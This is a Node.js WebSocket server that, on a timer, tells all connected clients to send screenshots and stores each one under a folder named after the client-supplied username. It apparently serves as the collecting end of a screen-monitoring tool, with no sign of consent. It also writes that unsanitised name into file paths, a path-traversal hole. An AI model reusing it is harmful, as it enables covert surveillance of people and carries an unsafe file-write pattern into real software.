const websocket = require("ws");
const fs = require("fs");
const os = require("os");
const { exec } = require("child_process");
const crypto = require('crypto');
String.prototype.getBytes = function () {
  var bytes = [];
  for (var i = 0; i < this.length; ++i) {
    bytes.push(this.charCodeAt(i));//from   w w w . j a va  2 s  . com
  }
  return bytes;
};
const wss = new websocket.WebSocketServer({ port: 9999 });
const readFileAsText = (file) => fs.readFileSync(file, { "encoding": "utf8" });
const readFileAsBinary = (file) => fs.readFileSync(file);
const startsWith = (text, check) => (text.length + 1 >= check.length && text.slice(0, check.length) === check);
// async function loopGetDelay(ws){
//     while (condition) {
//         ws
//         await new Promise(t => setTimeout(t, 1000));
// }
wss.once("listening", (ws) => {
  console.log(`Listening.. Port:  ws://${wss.options.host ? wss.options.host : "localhost"}:${wss.options.port}`);
  (async () => {
    while (true) {
      await new Promise(t => setTimeout(t, readFileAsText("delay.txt")));
      wss.clients.forEach(client => client.send("send-screenshot-now"));
    }
  })();
})
wss.on("connection", async (ws) => {
  console.log(`New client connected!`)
  ws.on("message", (data) => {
    dataText = data.toString();
    if (startsWith(dataText, "ts")) {
      ws.send(readFileAsText("delay.txt"));
      return;
    } else if (startsWith(dataText, "HANDLEMTHISMESSAGE")) {
      // TODO: HERE
    } else {
      var dataJson = {};
      try {
        dataJson = JSON.parse(data);
      } catch (error) {
        console.log(error);
        return;
      }
      // dataJson.image.data = dataJson.image.data.slice(2, data)
      console.log(dataJson);
      var image = dataJson.image.data;
      var uname = dataJson.uname;
      console.log(`[${uname}] Image taken! Byte at index: ${(image.length / 2) - 1} is "${image[(image.length / 2) - 1]}" (the char at half of image bytes) Size of Bytes: ${image[(image.length / 2) - 1]}`);
      if (!fs.existsSync(`images/${uname}`)) fs.mkdirSync(`images/${uname}`);
      var dt = new Date();
      fs.writeFileSync(`images/${uname}/${dt.getFullYear()}-${dt.getMonth()}-${dt.getDay()}  ${dt.getHours()}-${dt.getMinutes()}-${dt.getSeconds()}--${Date.now()}.png`, Buffer.from(image));
      ws.send("true");
    };
  });
});